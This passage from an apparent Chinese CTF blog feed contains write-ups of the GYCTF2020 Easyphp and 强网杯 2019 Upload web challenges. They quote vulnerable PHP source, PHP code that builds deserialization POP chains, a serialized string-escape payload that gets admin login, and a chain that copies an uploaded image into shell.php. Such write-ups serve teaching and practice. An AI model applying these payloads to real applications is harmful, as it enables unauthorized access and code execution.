class="title">login</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;连接失败，错误:&quot;</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123; <span class="comment">//session中的token可以理解为令牌，记录账户权限，admin权限则直接过，也就是后门？</span></span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123; <span class="comment">//结果集为空，则用户不存在</span></span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;用户不存在!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;<span class="comment">//密码错误则登录失败</span></span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;密码错误！&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;token&#x27;</span>]=<span class="keyword">$this</span>-&gt;name;<span class="comment">//核验无误，记录登录token</span></span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们要利用这个“后门”，获取admin权限</p><h4><span id="反序列化">反序列化</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        $age=$Info-&gt;age;</span><br><span class="line">        $nickname=$Info-&gt;nickname;</span><br><span class="line">        $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">&#x27;id&#x27;</span>],$Info,<span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>unserialize($this-&gt;getNewinfo());</strong>    利用序列化传递实体类信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $age=$_POST[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">    $nickname=$_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">    <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成<code>Info</code>类的实例，并<strong>序列化传递</strong></p><p>safe 检测：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params">$parm</span>)</span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">&#x27;hacker&#x27;</span>,$parm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>替换……如果可以构建<strong>反序列化字符串逃逸</strong>，那序列化字符串将是不安全的</p><p>找一下魔法方法：</p><p><img src="/images/GYCTF2020-Easyphp/image-20210827221951009.png" alt="image-20210827221951009"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//User: destruct</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;nickname);<span class="comment">//危</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>似乎是一个点，但不完全是……因为被过滤了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//UpdateHelper: destruct</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>-&gt; tostring</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//User: toString</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>-&gt; call</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Info: call</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name,$argument</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以调一个login方法，login有两个，一个是数据层的一个是用户类的</p><p>更底层的数据操作的sql语句是我们可以控制的，我们可以控制一个<strong>恒对</strong>的语句返回true的<code>id</code>结果集</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select 1,2;</span><br><span class="line">_ _ _ _ _ _ _ _</span><br><span class="line">|id|password |</span><br><span class="line">|1|2        |</span><br></pre></td></tr></table></figure><p>由于密码是md5的验证</p><p>我们可以控制password为1：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="string">&quot;c4ca4238a0b923820dcc509a6f75849b&quot;</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=?</span><br></pre></td></tr></table></figure><p>或者控制token为admin即可</p><p>pop：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="string">&quot;select 1,\&quot;c4ca4238a0b923820dcc509a6f75849b\&quot; from user where username=?&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname = <span class="keyword">new</span> Info();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;CtrlCase = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sql = <span class="keyword">new</span> User();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> UpdateHelper();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure><p>获取序列化对象处：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $age=$_POST[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">    $nickname=$_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">    <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原本的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">age&#x3D;1&amp;nickname&#x3D;1</span><br><span class="line"></span><br><span class="line">O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:1:&quot;1&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p>在nickname处构建逃逸</p><p>对象数据放在<code>CtrlCase</code>中</p><p><img src="/images/GYCTF2020-Easyphp/image-20210828000602366.png" alt="image-20210828000602366"></p><p>符合构建标准后，多余字符被废弃</p><p>构建 payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">age&#x3D;1&amp;nickname&#x3D;****************************************************unionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;;&#125;</span><br></pre></td></tr></table></figure><p>回显后，登录<code>admin</code>账号</p><p>index：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;lib.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="keyword">__DIR__</span>.<span class="string">&quot;/&quot;</span>.$_GET[<span class="string">&#x27;action&#x27;</span>].<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>]==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=update&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=login&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>session已设置，直接转到updata包含读取flag：</p><img src="/images/GYCTF2020-Easyphp/image-20210827234558705.png" alt="image-20210827234558705" style="zoom:80%;">]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;文件泄露、代码审计、反序列化&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>强网杯-2019-Upload</title>
    <link href="http://example.com/2021/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-Upload/"/>
    <id>http://example.com/2021/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-Upload/</id>
    <published>2021-08-26T13:04:24.781Z</published>
    <updated>2021-08-29T11:30:32.815Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>代码审计、文件上传、反序列化、文件泄露</p><a id="more"></a></blockquote><div class="toc"><!-- toc --><ul><li><a href="#%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2">文件泄露</a></li><li><a href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">代码审计</a></li><li><a href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">文件上传</a></li><li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">反序列化</a></li></ul><!-- tocstop --></div><br><p>首先是注册与登录，登陆后，每个账户可以上传一张头像。</p><p>存在upload文件夹，可以看到，头像文件被重命名且拼接解析为<code>.png</code></p><h4><span id="文件泄露">文件泄露</span></h4><p>鉴于目前的情况……比较困难，对字典、线程、间隔时间的设置有较高的要求……</p><p>尝试好多搭配，成功两次，挺玄妙的……</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-Upload/image-20210826211255110.png" alt="image-20210826211255110"></p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-Upload/image-20210826211301886.png" alt="image-20210826211301886"></p><h4><span id="代码审计">代码审计</span></h4><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-Upload/image-20210826211351430.png" alt="image-20210826211351430"></p><p>mvc</p><p>抓包测试时，cookie 中有一个 user。base64后的序列化数据</p><p>这个序列化是用来检查登录状态的：</p><p>index.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $profile=cookie(<span class="string">&#x27;user&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($profile))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode($profile));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">&#x27;user&#x27;</span>)-&gt;where(<span class="string">&quot;ID&quot;</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">&#x27;ID&#x27;</span>]))-&gt;find();</span><br><span class="line">            <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>通过这个反序列化点构造攻击</p><h4><span id="文件上传">文件上传</span></h4><p>再来看看个人信息的头像上传：</p><p>profile.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=<span class="string">&quot;http://&quot;</span>.$_SERVER[<span class="string">&#x27;HTTP_HOST&#x27;</span>].$_SERVER[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Forbidden type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Unknow file type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>由于参数可控，可以通过控制参数绕过文件名拼接，借助<code>copy</code>将我们绕过上传的图片shell更改为php解析</p><p>构建pop链需要入口</p><h4><span id="反序列化">反序列化</span></h4><p>web应用中的魔法方法：</p><img src="/images/强网杯-2019-Upload/image-20210826232551939.png" alt="image-20210826232551939" style="zoom:80%;"><p>只有destruct可用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用index方法，可以call</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name, $arguments</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>动态调用函数，如果可以控制<code>name</code>，就可以调用文件上传</p><p>上面就有一个符合条件的get</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所有可控</p><p>pop：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">class</span> <span class="title">Profile</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checker</span>;</span><br><span class="line">        <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">        <span class="keyword">public</span> $filename;</span><br><span class="line">        <span class="keyword">public</span> $upload_menu;</span><br><span class="line">        <span class="keyword">public</span> $ext;</span><br><span class="line">        <span class="keyword">public</span> $img;</span><br><span class="line">        <span class="keyword">public</span> $except;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;except[<span class="string">&#x27;index&#x27;</span>] = <span class="string">&#x27;upload_img&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp = <span class="string">&#x27;../public/upload/b78934111bc6a120a7957cbc2e531338/6e6a7627c6f6e9e3a95e30d1de17d47c.png&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename = <span class="string">&#x27;../public/upload/b78934111bc6a120a7957cbc2e531338/shell.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $checker;</span><br><span class="line">        <span class="keyword">public</span> $registed;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker = <span class="keyword">new</span> Profile();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $a =<span class="keyword">new</span> Register();</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize($a));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>登录时将序列化数据写入cookie</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-Upload/image-20210826233218385.png" 